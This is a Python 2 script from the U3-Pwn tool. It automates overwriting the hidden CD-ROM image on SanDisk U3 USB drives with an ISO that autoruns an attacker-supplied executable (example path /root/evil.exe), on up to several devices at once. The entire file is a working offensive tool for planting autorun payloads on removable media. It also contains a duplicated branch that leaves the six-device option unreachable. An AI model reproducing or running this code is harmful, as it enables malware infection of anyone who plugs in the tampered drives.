#!/usr/bin/env python
# -*- coding: latin-1 -*- ######################################################
#                ____                     _ __                                 #
#     ___  __ __/ / /__ ___ ______ ______(_) /___ __                           #
#    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                           #
#   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                            #
#                                            /___/ team                        #
#                                                                              #
# customexe.py                                                                 #
#                                                                              #
# DATE                                                                         #
# 06/27/2012                                                                   #
#                                                                              #
# DESCRIPTION                                                                  #
# U3-Pwn is a tool designed to automate injecting executables to Sandisk       #
# smart usb devices with default U3 software install. This is performed by     # 
# removing the original iso file from the device and creating a new iso        #
# with autorun features.                                                       #
#                                                                              #
# REQUREMENTS                                                                  #
# - Metasploit                                                                 #
# - U3-Tool                                                                    #
# - Python-2.6                                                                 #
#                                                                              #
# AUTHOR                                                                       #
# Zy0d0x - http://www.nullsecurity.net/                                        #
#                                                                              #
################################################################################


try:
    import subprocess
    import pexpect
    import time
    import os
    import sys
    import shutil
except ImportError:
    pass
definepath = os.getcwd()
sys.path.append('%s/src/' % definepath)
import banner

try:
    banner.print_banner()
    payload = \
        raw_input('''   Please enter filepath & executerble name example(/root/evil.exe): '''
                  )
    choice = \
        raw_input('''\n   How many devices would you like to inject to 1,2,4,6,: '''
                  )
    if payload == '':
        print '''   [-]Custom Exe Missing'''
        time.sleep(2)
    else:
        banner.print_banner
        print '''\n   Generating Iso File Please Wait...'''
        shutil.copy(payload, 'resource/LaunchU3.exe')
        file = open('resource/LaunchU3.bat', 'w')
        file.write('LaunchU3.exe ')
        file.close()
        subprocess.Popen('mkisofs -volid U3\ System -o resource/U3\ System.iso resource/'
                         , stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE, shell=True).wait()

        if choice == '1':
            device1 = \
                raw_input('''\n   Enter the device to change iso image on (example /dev/sde1): '''
                          )
            if device1 == '':
                print '''   [-]Device Missing Returning To Menu'''
                time.sleep(2)
            else:
                child1 = pexpect.spawn('u3-tool -v  -p 1302528 '
                        + device1)
                child1.sendline('y')
                time.sleep(5)

                subprocess.Popen('u3-tool -v -l resource/U3\ System.iso %s'
                                  % device1, shell=True).wait()
                os.remove('resource/LaunchU3.exe')
                os.remove('resource/LaunchU3.bat')
                os.system('rm resource/U3\ System.iso')
                shutil.copy('backup/LaunchU3.exe',
                            'resource/LaunchU3.exe')
                print '''\n   Custom Exe Succfully injected into ''' \
                    + device1
                time.sleep(2)

        if choice == '2':
            device1 = \
                raw_input('''\nEnter the device to change iso image on (example /dev/sde1): '''
                          )
            device2 = raw_input('''\nEnter next device: ''')
            if device1 == '' or device2 == '':
                print '''   [-]Device Missing Returning To Menu'''
                time.sleep(2)
            else:
                child1 = pexpect.spawn('u3-tool -v  -p 1302528 '
                        + device1)
                child1.sendline('y')
                child1 = pexpect.spawn('u3-tool -v  -p 1302528 '
                        + device2)
                child1.sendline('y')
                time.sleep(5)
                subprocess.Popen('u3-tool -v -l resource/U3\ System.iso %s'
                                  % device1, shell=True).wait()
                subprocess.Popen('u3-tool -v -l resource/U3\ System.iso %s'
                                  % device2, shell=True).wait()
                os.remove('resource/LaunchU3.exe')
                os.remove('resource/LaunchU3.bat')
                os.remove('resource/U3\ System.iso')
                shutil.copy('backup/LaunchU3.exe',
                            'resource/LaunchU3.exe')
                print '''\n   Custom Exe Succfully injected into ''' \
                    + device1 + device2
                time.sleep(2)

        if choice == '4':
            device1 = \
                raw_input('''\n     Enter the device to change iso image on (example /dev/sde1): '''
                          )
            device2 = raw_input('''\n   Enter next device: ''')
            device3 = raw_input('''\n   Enter next device: ''')
            device4 = raw_input('''\n   Enter next device: ''')
            if device1 == '' or device2 == '' or device3 == '' \
                or device4 == '':
                print '''   [-]Device Missing Returning To Menu'''
                time.sleep(2)
            else:
                child1 = pexpect.spawn('u3-tool -v  -p 1302528 '
                        + device1)
                child1.sendline('y')
                child1 = pexpect.spawn('u3-tool -v  -p 1302528 '
                        + device2)
                child1.sendline('y')
                child1 = pexpect.spawn('u3-tool -v  -p 1302528 '
                        + device3)
                child1.sendline('y')
                child1 = pexpect.spawn('u3-tool -v  -p 1302528 '
                        + device4)
                child1.sendline('y')
                time.sleep(5)
                subprocess.Popen('u3-tool -v -l resource/U3\ System.iso %s'
                                  % device1, shell=True).wait()
                subprocess.Popen('u3-tool -v -l resource/U3\ System.iso %s'
                                  % device2, shell=True).wait()
                subprocess.Popen('u3-tool -v -l resource/U3\ System.iso %s'
                                  % device3, shell=True).wait()
                subprocess.Popen('u3-tool -v -l resource/U3\ System.iso %s'
                                  % device4, shell=True).wait()
                os.remove('resource/LaunchU3.exe')
                os.remove('resource/LaunchU3.bat')
                os.remove('resource/U3\ System.iso')
                shutil.copy('backup/LaunchU3.exe',
                            'resource/LaunchU3.exe')
                print '''\n   Custom Exe Succfully injected into ''' \
                    + device1 + device2 + device3 + device4
                time.sleep(2)

        if choice == '4':
            device1 = \
                raw_input('''\n     Enter the device to change iso image on (example /dev/sde1): '''
                          )
            device2 = raw_input('''\n   Enter next device: ''')
            device3 = raw_input('''\n   Enter next device: ''')
            device4 = raw_input('''\n   Enter next device: ''')
            device5 = raw_input('''\n   Enter next device: ''')
            device6 = raw_input('''\n   Enter next device: ''')

            if device1 == '' or device2 == '' or device3 == '' \
                or device4 == '' or device5 == '' or device6 == '':
                print '''   [-]Device Missing Returning To Menu'''
                time.sleep(2)
            else:
                child1 = pexpect.spawn('u3-tool -v  -p 1302528 '
                        + device1)
                child1.sendline('y')
                child1 = pexpect.spawn('u3-tool -v  -p 1302528 '
                        + device2)
                child1.sendline('y')
                child1 = pexpect.spawn('u3-tool -v  -p 1302528 '
                        + device3)
                child1.sendline('y')
                child1 = pexpect.spawn('u3-tool -v  -p 1302528 '
                        + device4)
                child1.sendline('y')
                child1 = pexpect.spawn('u3-tool -v  -p 1302528 '
                        + device5)
                child1.sendline('y')
                child1 = pexpect.spawn('u3-tool -v  -p 1302528 '
                        + device6)
                child1.sendline('y')
                time.sleep(5)
                subprocess.Popen('u3-tool -v -l resource/U3\ System.iso %s'
                                  % device1, shell=True).wait()
                subprocess.Popen('u3-tool -v -l resource/U3\ System.iso %s'
                                  % device2, shell=True).wait()
                subprocess.Popen('u3-tool -v -l resource/U3\ System.iso %s'
                                  % device3, shell=True).wait()
                subprocess.Popen('u3-tool -v -l resource/U3\ System.iso %s'
                                  % device4, shell=True).wait()
                subprocess.Popen('u3-tool -v -l resource/U3\ System.iso %s'
                                  % device5, shell=True).wait()
                subprocess.Popen('u3-tool -v -l resource/U3\ System.iso %s'
                                  % device6, shell=True).wait()
                os.remove('resource/LaunchU3.exe')
                os.remove('resource/LaunchU3.bat')
                os.remove('resource/U3\ System.iso')
                shutil.copy('backup/LaunchU3.exe',
                            'resource/LaunchU3.exe')
                print '''\n   Custom Exe Succfully injected into ''' \
                    + device1 + device2 + device3 + device4 + device5 \
                    + device6
                time.sleep(2)
except KeyboardInterrupt:
    print '''

   [-]Keyboard Interrupt Detected, Returning To Menu.....'''
    time.sleep(2)
except Exception, error:
    print '''

   [-]Something went wrong, printing error message....'''
    print error
    time.sleep(2)
    sys.exit(0)
